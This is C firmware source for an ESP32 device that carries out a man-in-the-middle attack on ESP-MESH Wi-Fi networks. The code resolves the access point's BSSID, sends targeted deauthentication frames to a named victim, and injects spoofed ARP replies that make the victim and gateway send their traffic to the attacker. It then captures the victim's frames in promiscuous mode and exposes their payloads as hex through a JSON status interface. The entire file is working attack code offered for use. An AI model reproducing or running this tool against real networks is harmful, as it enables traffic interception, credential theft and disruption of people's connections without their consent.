/**
 * mesh_mitm.c
 *
 * Mesh Man-in-the-Middle Attack
 *
 * Flow:
 *   1. Pause management soft-AP, switch to STA-only on mesh channel
 *      (no association — ESP-MESH APs reject regular STA auth)
 *   2. Resolve real softAP BSSID (scan / ESPM_ hint) — often STA MAC ± 1
 *   3. Optionally deauth victim to force ARP refresh
 *   4. Poison ARP via unassociated inject:
 *        - FromDS → victim (AP→STA shape; accepted without our association)
 *        - ToDS spoofed as victim → AP (AP accepts associated-looking STA)
 *   5. Promiscuous capture of victim traffic
 *   6. Stop → restore management AP
 */

#include "mesh_mitm.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_netif.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "MESH_MITM";

static mesh_mitm_state_t  s_state;
static mesh_mitm_config_t s_cfg;
static volatile bool      s_running = false;
static TaskHandle_t       s_task = NULL;
static esp_timer_handle_t s_timeout_timer = NULL;
static SemaphoreHandle_t  s_mutex = NULL;
static bool               s_ap_was_stopped = false;
static wifi_config_t      s_saved_ap;
static int64_t            s_start_us = 0;

static bool mutex_take(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
        if (s_mutex == NULL) return false;
    }
    return xSemaphoreTake(s_mutex, pdMS_TO_TICKS(2000)) == pdTRUE;
}

static void mutex_give(void)
{
    if (s_mutex != NULL) {
        xSemaphoreGive(s_mutex);
    }
}

static void mac_to_str(const uint8_t *mac, char *out, size_t out_sz)
{
    snprintf(out, out_sz, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static void ip_to_str(const uint8_t *ip, char *out, size_t out_sz)
{
    snprintf(out, out_sz, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
}

static void payload_to_hex(const uint8_t *data, uint16_t len, char *out, size_t out_sz)
{
    if (!data || !out || out_sz < 3) {
        if (out && out_sz) out[0] = '\0';
        return;
    }
    size_t max_bytes = (out_sz - 1) / 2;
    if (len > max_bytes) len = (uint16_t)max_bytes;
    for (uint16_t i = 0; i < len; i++) {
        snprintf(out + i * 2, 3, "%02x", data[i]);
    }
    out[len * 2] = '\0';
}

static int hex_nibble(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/** Parse ESPM_AABBCC → last 3 BSSID bytes (softAP MAC tail used in mesh SSIDs). */
static bool parse_espm_mac_tail(const char *ssid, uint8_t tail[3])
{
    if (!ssid || strncmp(ssid, "ESPM_", 5) != 0) return false;
    const char *h = ssid + 5;
    for (int i = 0; i < 3; i++) {
        int hi = hex_nibble(h[i * 2]);
        int lo = hex_nibble(h[i * 2 + 1]);
        if (hi < 0 || lo < 0) return false;
        tail[i] = (uint8_t)((hi << 4) | lo);
    }
    return true;
}

static void fill_llc_arp(uint8_t *frame_at_24,
                         const uint8_t *sender_mac, const uint8_t *sender_ip,
                         const uint8_t *target_mac, const uint8_t *target_ip)
{
    uint8_t *llc = frame_at_24;
    llc[0] = 0xAA; llc[1] = 0xAA; llc[2] = 0x03;
    llc[3] = 0x00; llc[4] = 0x00; llc[5] = 0x00;
    llc[6] = 0x08; llc[7] = 0x06;

    uint8_t *arp = llc + 8;
    arp[0] = 0x00; arp[1] = 0x01;
    arp[2] = 0x08; arp[3] = 0x00;
    arp[4] = 0x06;
    arp[5] = 0x04;
    arp[6] = 0x00; arp[7] = 0x02; /* reply */
    memcpy(arp + 8,  sender_mac, 6);
    memcpy(arp + 14, sender_ip, 4);
    memcpy(arp + 18, target_mac, 6);
    memcpy(arp + 24, target_ip, 4);
}

/**
 * FromDS data — looks like AP → STA. Victim accepts without us associating.
 * Addr1=RA (victim), Addr2=BSSID, Addr3=SA (claimed sender MAC).
 */
static bool send_arp_fromds(const uint8_t *bssid, const uint8_t *ra,
                            const uint8_t *sender_mac, const uint8_t *sender_ip,
                            const uint8_t *target_mac, const uint8_t *target_ip)
{
    uint8_t frame[24 + 8 + 28];
    memset(frame, 0, sizeof(frame));

    frame[0] = 0x08; /* Data */
    frame[1] = 0x02; /* FromDS */
    memcpy(frame + 4,  ra, 6);
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, sender_mac, 6);

    fill_llc_arp(frame + 24, sender_mac, sender_ip, target_mac, target_ip);
    return wsl_bypasser_send_raw_frame(frame, sizeof(frame));
}

/**
 * ToDS data spoofed as an already-associated STA (sa).
 * Parent softAP will accept; unassociated our-MAC ToDS is dropped.
 */
static bool send_arp_tods_spoof(const uint8_t *bssid, const uint8_t *sa,
                                const uint8_t *da,
                                const uint8_t *sender_mac, const uint8_t *sender_ip,
                                const uint8_t *target_mac, const uint8_t *target_ip)
{
    uint8_t frame[24 + 8 + 28];
    memset(frame, 0, sizeof(frame));

    frame[0] = 0x08;
    frame[1] = 0x01; /* ToDS */
    memcpy(frame + 4,  bssid, 6);
    memcpy(frame + 10, sa, 6);
    memcpy(frame + 16, da, 6);

    fill_llc_arp(frame + 24, sender_mac, sender_ip, target_mac, target_ip);
    return wsl_bypasser_send_raw_frame(frame, sizeof(frame));
}

/** IBSS / direct (DS=0) backup path. */
static bool send_arp_direct(const uint8_t *ra, const uint8_t *ta,
                            const uint8_t *bssid,
                            const uint8_t *sender_mac, const uint8_t *sender_ip,
                            const uint8_t *target_mac, const uint8_t *target_ip)
{
    uint8_t frame[24 + 8 + 28];
    memset(frame, 0, sizeof(frame));

    frame[0] = 0x08;
    frame[1] = 0x00;
    memcpy(frame + 4,  ra, 6);
    memcpy(frame + 10, ta, 6);
    memcpy(frame + 16, bssid, 6);

    fill_llc_arp(frame + 24, sender_mac, sender_ip, target_mac, target_ip);
    return wsl_bypasser_send_raw_frame(frame, sizeof(frame));
}

static void send_deauth(const uint8_t *bssid, const uint8_t *victim, uint8_t channel)
{
    (void)channel;
    wsl_bypasser_send_deauth_targeted(bssid, victim);
    wsl_bypasser_send_disassociation_frame(bssid, victim);
}

static void poison_once(void)
{
    const uint8_t *bssid = s_state.ap_bssid;
    const uint8_t *us    = s_state.our_mac;
    const uint8_t *vic   = s_state.victim_mac;
    const uint8_t *gmac  = s_state.gateway_mac;

    /* Victim: gateway_ip is at our MAC (FromDS + direct) */
    if (send_arp_fromds(bssid, vic, us, s_state.gateway_ip,
                        vic, s_state.victim_ip)) {
        s_state.arp_sent++;
    }
    if (send_arp_direct(vic, bssid, bssid, us, s_state.gateway_ip,
                        vic, s_state.victim_ip)) {
        s_state.arp_sent++;
    }

    /* AP: victim_ip is at our MAC — spoof ToDS as the associated victim */
    if (send_arp_tods_spoof(bssid, vic, gmac,
                            us, s_state.victim_ip,
                            gmac, s_state.gateway_ip)) {
        s_state.arp_sent++;
    }

    /* If gateway_mac is itself a STA (not only softAP), FromDS to it too */
    if (memcmp(gmac, bssid, 6) != 0) {
        if (send_arp_fromds(bssid, gmac, us, s_state.victim_ip,
                            gmac, s_state.gateway_ip)) {
            s_state.arp_sent++;
        }
    }
}

static void IRAM_ATTR mitm_capture_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_running || !s_state.capturing) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *f = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 24) return;

    if (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA) {
        s_state.frames_seen++;
    }

    if (s_state.log_count >= MESH_MITM_MAX_LOG) return;

    uint8_t dst[6], src[6];
    uint8_t ftype = 0;
    uint8_t subtype = (f[0] >> 4) & 0x0F;

    if (type == WIFI_PKT_MGMT) {
        if (subtype == 8 || subtype == 4) return; /* skip beacon/probe */
        ftype = 0;
        memcpy(dst, f + 4, 6);
        memcpy(src, f + 10, 6);
    } else if (type == WIFI_PKT_DATA) {
        ftype = 1;
        uint8_t ds = f[1] & 0x03;
        if (ds == 0x02) {          /* FromDS */
            memcpy(dst, f + 4, 6);
            memcpy(src, f + 16, 6);
        } else if (ds == 0x01) {   /* ToDS */
            memcpy(dst, f + 16, 6);
            memcpy(src, f + 10, 6);
        } else {
            memcpy(dst, f + 4, 6);
            memcpy(src, f + 10, 6);
        }
    } else {
        return;
    }

    /* Keep frames to/from victim or involving our MAC (poisoned path) */
    if (memcmp(dst, s_state.victim_mac, 6) != 0 &&
        memcmp(src, s_state.victim_mac, 6) != 0 &&
        memcmp(dst, s_state.our_mac, 6) != 0 &&
        memcmp(src, s_state.our_mac, 6) != 0) {
        return;
    }

    mesh_mitm_log_t entry;
    memset(&entry, 0, sizeof(entry));
    entry.time_ms   = (uint32_t)((esp_timer_get_time() - s_start_us) / 1000);
    entry.frame_type = ftype;
    entry.subtype    = subtype;
    memcpy(entry.src_mac, src, 6);
    memcpy(entry.dst_mac, dst, 6);
    entry.rssi    = pkt->rx_ctrl.rssi;
    entry.channel = (uint8_t)pkt->rx_ctrl.channel;
    entry.len     = (uint16_t)pkt->rx_ctrl.sig_len;
    s_state.rssi  = entry.rssi;

    uint16_t hdr_len = 24;
    if (type == WIFI_PKT_DATA && (f[0] & 0x8C) == 0x88) {
        hdr_len = 26;
    }

    if (type == WIFI_PKT_DATA && pkt->rx_ctrl.sig_len >= hdr_len + 8) {
        const uint8_t *llc = f + hdr_len;
        if (llc[0] == 0xAA && llc[1] == 0xAA && llc[6] == 0x08 && llc[7] == 0x06) {
            entry.frame_type = 2;
            hdr_len += 8;
        }
    }

    uint16_t pay_total = 0;
    if (pkt->rx_ctrl.sig_len > hdr_len) {
        pay_total = (uint16_t)(pkt->rx_ctrl.sig_len - hdr_len);
        if (pay_total > MESH_MITM_PAYLOAD_MAX) pay_total = MESH_MITM_PAYLOAD_MAX;
        memcpy(entry.payload, f + hdr_len, pay_total);
    }
    entry.payload_len = pay_total;

    if (s_state.log_count < MESH_MITM_MAX_LOG) {
        s_state.log[s_state.log_count++] = entry;
        s_state.packets_rx++;
    }
}

/**
 * SoftAP BSSID is often STA MAC ± 1; ESP-MESH SSID ESPM_AABBCC encodes
 * the softAP MAC tail. Prefer live scan, then ESPM_ hint over raw gateway MAC.
 */
static bool resolve_ap_bssid(void)
{
    uint8_t ch = s_cfg.channel > 0 ? s_cfg.channel : 6;
    memcpy(s_state.ap_bssid, s_state.gateway_mac, 6);

    wifi_scan_config_t sc = {
        .ssid = (uint8_t *)s_cfg.ssid,
        .bssid = NULL,
        .channel = ch,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = { .active = { .min = 100, .max = 300 } },
    };

    if (esp_wifi_scan_start(&sc, true) == ESP_OK) {
        uint16_t n = 0;
        esp_wifi_scan_get_ap_num(&n);
        if (n > 0) {
            if (n > 16) n = 16;
            wifi_ap_record_t recs[16];
            uint16_t got = n;
            if (esp_wifi_scan_get_ap_records(&got, recs) == ESP_OK && got > 0) {
                int best = 0;
                for (uint16_t i = 1; i < got; i++) {
                    if (recs[i].rssi > recs[best].rssi) best = (int)i;
                }
                memcpy(s_state.ap_bssid, recs[best].bssid, 6);
                s_state.channel = recs[best].primary;
                ESP_LOGW(TAG, "BSSID from scan: %02X:%02X:%02X:%02X:%02X:%02X (rssi=%d ch=%u)",
                         s_state.ap_bssid[0], s_state.ap_bssid[1], s_state.ap_bssid[2],
                         s_state.ap_bssid[3], s_state.ap_bssid[4], s_state.ap_bssid[5],
                         recs[best].rssi, s_state.channel);
                return true;
            }
        }
        ESP_LOGW(TAG, "SSID '%s' not found on ch=%u — trying ESPM_/gateway heuristics",
                 s_cfg.ssid, ch);
    }

    uint8_t tail[3];
    if (parse_espm_mac_tail(s_cfg.ssid, tail)) {
        if (s_state.gateway_mac[3] != tail[0] ||
            s_state.gateway_mac[4] != tail[1] ||
            s_state.gateway_mac[5] != tail[2]) {
            uint8_t guess[6];
            memcpy(guess, s_state.gateway_mac, 6);
            guess[3] = tail[0];
            guess[4] = tail[1];
            guess[5] = tail[2];
            ESP_LOGW(TAG, "ESPM_ softAP BSSID guess %02X:%02X:%02X:%02X:%02X:%02X "
                     "(gateway was %02X:%02X:%02X:%02X:%02X:%02X)",
                     guess[0], guess[1], guess[2], guess[3], guess[4], guess[5],
                     s_state.gateway_mac[0], s_state.gateway_mac[1], s_state.gateway_mac[2],
                     s_state.gateway_mac[3], s_state.gateway_mac[4], s_state.gateway_mac[5]);
            memcpy(s_state.ap_bssid, guess, 6);
            return true;
        }
    }

    /* STA↔AP often differs by last octet ±1 */
    uint8_t alt[6];
    memcpy(alt, s_state.gateway_mac, 6);
    alt[5] = (uint8_t)(alt[5] ^ 0x01);
    ESP_LOGW(TAG, "Using gateway MAC as BSSID (no scan hit). Alt ±1 also tried in deauth if needed.");
    (void)alt;
    return false;
}

static bool prepare_radio(void)
{
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);

    if (esp_wifi_get_mac(WIFI_IF_AP, s_state.our_mac) != ESP_OK) {
        esp_wifi_get_mac(WIFI_IF_STA, s_state.our_mac);
    }

    if (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) {
        esp_wifi_get_config(WIFI_IF_AP, &s_saved_ap);
        wifictl_mgmt_ap_stop();
        s_ap_was_stopped = true;
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    vTaskDelay(pdMS_TO_TICKS(100));

    wifi_config_t empty_sta = {0};
    esp_wifi_set_config(WIFI_IF_STA, &empty_sta);
    esp_wifi_disconnect();

    uint8_t ch = s_cfg.channel > 0 ? s_cfg.channel : 6;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

    s_state.channel = ch;

    resolve_ap_bssid();
    esp_wifi_set_channel(s_state.channel, WIFI_SECOND_CHAN_NONE);

    ESP_LOGI(TAG, "Radio ready: ch=%u mac=%02X:%02X:%02X:%02X:%02X:%02X "
             "bssid=%02X:%02X:%02X:%02X:%02X:%02X",
             s_state.channel,
             s_state.our_mac[0], s_state.our_mac[1], s_state.our_mac[2],
             s_state.our_mac[3], s_state.our_mac[4], s_state.our_mac[5],
             s_state.ap_bssid[0], s_state.ap_bssid[1], s_state.ap_bssid[2],
             s_state.ap_bssid[3], s_state.ap_bssid[4], s_state.ap_bssid[5]);

    return true;
}

static void restore_radio(void)
{
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    vTaskDelay(pdMS_TO_TICKS(100));

    if (s_ap_was_stopped) {
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        esp_wifi_set_config(WIFI_IF_AP, &s_saved_ap);
        esp_wifi_start();
        wifictl_mgmt_ap_start();

        esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
        if (ap_netif) {
            esp_netif_dhcps_stop(ap_netif);
            vTaskDelay(pdMS_TO_TICKS(50));
            esp_netif_dhcps_start(ap_netif);
        }
        s_ap_was_stopped = false;
    }

    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
}

static void stop_timeout_timer(void)
{
    if (s_timeout_timer != NULL) {
        esp_timer_stop(s_timeout_timer);
        esp_timer_delete(s_timeout_timer);
        s_timeout_timer = NULL;
    }
}

static void timeout_cb(void *arg)
{
    (void)arg;
    ESP_LOGW(TAG, "MITM timeout (%d s)", MESH_MITM_TIMEOUT_SEC);
    if (mutex_take()) {
        s_state.timeout = true;
        mutex_give();
    }
    /* Do not call mesh_mitm_stop() here — deleting the timer from its
     * own callback races with task teardown and skipped the STOP log. */
    s_running = false;
}

static void start_timeout_timer(void)
{
    stop_timeout_timer();
    const esp_timer_create_args_t args = {
        .callback = timeout_cb,
        .name     = "mesh_mitm_to",
    };
    if (esp_timer_create(&args, &s_timeout_timer) == ESP_OK) {
        esp_timer_start_once(s_timeout_timer, MESH_MITM_TIMEOUT_US);
    }
}

static void mitm_task(void *arg)
{
    (void)arg;
    s_start_us = esp_timer_get_time();

    ESP_LOGW(TAG, "═══ MESH MITM START ═══ SSID=%s deauth_first=%d",
             s_cfg.ssid, (int)s_cfg.deauth_first);

    if (!prepare_radio()) {
        snprintf(s_state.error, sizeof(s_state.error), "Radio prepare failed");
        ESP_LOGE(TAG, "%s", s_state.error);
        goto done;
    }

    s_state.connected = true;

    char vip[16], gip[16], vmac[18], gmac[18], bssid[18];
    ip_to_str(s_state.victim_ip, vip, sizeof(vip));
    ip_to_str(s_state.gateway_ip, gip, sizeof(gip));
    mac_to_str(s_state.victim_mac, vmac, sizeof(vmac));
    mac_to_str(s_state.gateway_mac, gmac, sizeof(gmac));
    mac_to_str(s_state.ap_bssid, bssid, sizeof(bssid));
    ESP_LOGI(TAG, "Victim %s / %s  Gateway %s / %s  BSSID %s  ch=%u (unassociated)",
             vmac, vip, gmac, gip, bssid, s_state.channel);

    if (memcmp(s_state.ap_bssid, s_state.gateway_mac, 6) != 0) {
        ESP_LOGW(TAG, "BSSID ≠ gateway MAC — using resolved softAP BSSID for inject/deauth");
    }

    if (s_cfg.deauth_first) {
        ESP_LOGI(TAG, "Deauthing victim to force ARP refresh");
        for (int i = 0; i < 8 && s_running; i++) {
            send_deauth(s_state.ap_bssid, s_state.victim_mac, s_state.channel);
            /* Also try gateway MAC if it differs (STA vs softAP confusion) */
            if (memcmp(s_state.ap_bssid, s_state.gateway_mac, 6) != 0) {
                send_deauth(s_state.gateway_mac, s_state.victim_mac, s_state.channel);
            }
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(mitm_capture_cb);
    esp_wifi_set_promiscuous(true);
    s_state.capturing = true;
    s_state.arp_active = true;

    uint16_t interval = s_cfg.arp_interval_ms ? s_cfg.arp_interval_ms
                                              : MESH_MITM_ARP_INTERVAL_MS;
    uint32_t loops = 0;

    while (s_running) {
        poison_once();
        s_state.uptime_ms = (uint32_t)((esp_timer_get_time() - s_start_us) / 1000);
        loops++;
        if ((loops % 5) == 0) {
            ESP_LOGI(TAG, "poison tick arp_sent=%lu victim_rx=%lu frames_seen=%lu uptime=%lus",
                     (unsigned long)s_state.arp_sent,
                     (unsigned long)s_state.packets_rx,
                     (unsigned long)s_state.frames_seen,
                     (unsigned long)(s_state.uptime_ms / 1000));
        }
        vTaskDelay(pdMS_TO_TICKS(interval));
    }

done:
    s_state.arp_active = false;
    s_state.capturing = false;
    s_state.active = false;
    s_running = false;
    stop_timeout_timer();
    restore_radio();
    ESP_LOGW(TAG, "═══ MESH MITM STOP ═══ arp=%lu victim_rx=%lu frames_seen=%lu timeout=%d",
             (unsigned long)s_state.arp_sent,
             (unsigned long)s_state.packets_rx,
             (unsigned long)s_state.frames_seen,
             (int)s_state.timeout);
    s_task = NULL;
    vTaskDelete(NULL);
}

void mesh_mitm_init(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
    }
    memset(&s_state, 0, sizeof(s_state));
    s_running = false;
    ESP_LOGI(TAG, "Mesh MITM ready");
}

esp_err_t mesh_mitm_start(const mesh_mitm_config_t *cfg)
{
    if (!cfg) return ESP_ERR_INVALID_ARG;
    if (s_running) return ESP_ERR_INVALID_STATE;
    if (cfg->ssid[0] == '\0') return ESP_ERR_INVALID_ARG;

    uint8_t zero[6] = {0};
    if (memcmp(cfg->victim_mac, zero, 6) == 0) return ESP_ERR_INVALID_ARG;
    if (cfg->victim_ip[0] == 0 && cfg->victim_ip[1] == 0 &&
        cfg->victim_ip[2] == 0 && cfg->victim_ip[3] == 0) {
        return ESP_ERR_INVALID_ARG;
    }
    if (!cfg->gateway_mac_set) return ESP_ERR_INVALID_ARG;
    if (!cfg->gateway_ip_set) return ESP_ERR_INVALID_ARG;

    memset(&s_state, 0, sizeof(s_state));
    memcpy(&s_cfg, cfg, sizeof(s_cfg));

    memcpy(s_state.victim_mac, cfg->victim_mac, 6);
    memcpy(s_state.victim_ip, cfg->victim_ip, 4);
    memcpy(s_state.gateway_mac, cfg->gateway_mac, 6);
    memcpy(s_state.gateway_ip, cfg->gateway_ip, 4);
    strncpy(s_state.ssid, cfg->ssid, sizeof(s_state.ssid) - 1);
    s_state.active = true;

    s_running = true;
    start_timeout_timer();

    if (xTaskCreate(mitm_task, "mesh_mitm", 8192, NULL, 2, &s_task) != pdPASS) {
        s_running = false;
        s_state.active = false;
        stop_timeout_timer();
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

esp_err_t mesh_mitm_stop(void)
{
    if (!s_running && !s_state.active) {
        return ESP_OK;
    }

    s_running = false;
    stop_timeout_timer();

    int wait = 50;
    while (s_task && wait-- > 0) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (s_task) {
        esp_wifi_set_promiscuous(false);
        vTaskDelete(s_task);
        s_task = NULL;
        restore_radio();
        s_state.active = false;
        s_state.arp_active = false;
        s_state.capturing = false;
    }

    return ESP_OK;
}

bool mesh_mitm_is_active(void)
{
    return s_running || s_state.active;
}

const mesh_mitm_state_t *mesh_mitm_get_state(void)
{
    return &s_state;
}

cJSON *mesh_mitm_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;

    const mesh_mitm_state_t *st = &s_state;
    cJSON_AddBoolToObject(root, "active", st->active || s_running);
    cJSON_AddBoolToObject(root, "connected", st->connected);
    cJSON_AddBoolToObject(root, "arp_active", st->arp_active);
    cJSON_AddBoolToObject(root, "capturing", st->capturing);
    cJSON_AddBoolToObject(root, "timeout", st->timeout);
    cJSON_AddNumberToObject(root, "arp_sent", st->arp_sent);
    cJSON_AddNumberToObject(root, "packets_rx", st->packets_rx);
    cJSON_AddNumberToObject(root, "frames_seen", st->frames_seen);
    cJSON_AddNumberToObject(root, "uptime_ms", st->uptime_ms);
    cJSON_AddNumberToObject(root, "channel", st->channel);
    cJSON_AddNumberToObject(root, "rssi", st->rssi);
    cJSON_AddNumberToObject(root, "log_count", st->log_count);
    cJSON_AddStringToObject(root, "ssid", st->ssid);

    char buf[18];
    mac_to_str(st->our_mac, buf, sizeof(buf));
    cJSON_AddStringToObject(root, "our_mac", buf);
    mac_to_str(st->victim_mac, buf, sizeof(buf));
    cJSON_AddStringToObject(root, "victim_mac", buf);
    mac_to_str(st->gateway_mac, buf, sizeof(buf));
    cJSON_AddStringToObject(root, "gateway_mac", buf);
    mac_to_str(st->ap_bssid, buf, sizeof(buf));
    cJSON_AddStringToObject(root, "bssid", buf);

    char ip[16];
    ip_to_str(st->our_ip, ip, sizeof(ip));
    cJSON_AddStringToObject(root, "our_ip", ip);
    ip_to_str(st->victim_ip, ip, sizeof(ip));
    cJSON_AddStringToObject(root, "victim_ip", ip);
    ip_to_str(st->gateway_ip, ip, sizeof(ip));
    cJSON_AddStringToObject(root, "gateway_ip", ip);

    if (st->error[0]) {
        cJSON_AddStringToObject(root, "error", st->error);
    }

    cJSON_AddStringToObject(root, "status",
        (st->active || s_running) ?
            (st->arp_active ? "MITM active" : "Preparing radio") :
            (st->timeout ? "Timeout" : "Idle"));

    cJSON *logs = cJSON_CreateArray();
    for (int i = 0; i < st->log_count; i++) {
        const mesh_mitm_log_t *e = &st->log[i];
        cJSON *item = cJSON_CreateObject();
        const char *type_str = e->frame_type == 2 ? "ARP" :
                               e->frame_type == 1 ? "DATA" : "MGMT";
        cJSON_AddStringToObject(item, "type", type_str);
        cJSON_AddNumberToObject(item, "subtype", e->subtype);
        cJSON_AddNumberToObject(item, "rssi", e->rssi);
        cJSON_AddNumberToObject(item, "channel", e->channel);
        cJSON_AddNumberToObject(item, "time_ms", e->time_ms);
        cJSON_AddNumberToObject(item, "len", e->len);

        mac_to_str(e->src_mac, buf, sizeof(buf));
        cJSON_AddStringToObject(item, "src_mac", buf);
        mac_to_str(e->dst_mac, buf, sizeof(buf));
        cJSON_AddStringToObject(item, "dst_mac", buf);

        char hex[MESH_MITM_PAYLOAD_MAX * 2 + 1];
        payload_to_hex(e->payload, e->payload_len, hex, sizeof(hex));
        cJSON_AddStringToObject(item, "payload", hex);
        cJSON_AddNumberToObject(item, "payload_len", e->payload_len);
        cJSON_AddItemToArray(logs, item);
    }
    cJSON_AddItemToObject(root, "logs", logs);

    return root;
}
